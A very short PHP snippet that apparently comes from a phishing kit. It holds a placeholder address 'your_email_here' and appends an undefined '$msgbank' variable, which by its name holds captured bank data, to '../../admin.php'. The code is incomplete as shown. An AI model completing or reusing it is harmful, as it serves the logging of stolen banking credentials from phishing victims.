<?php

$yourmail  = 'your_email_here';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>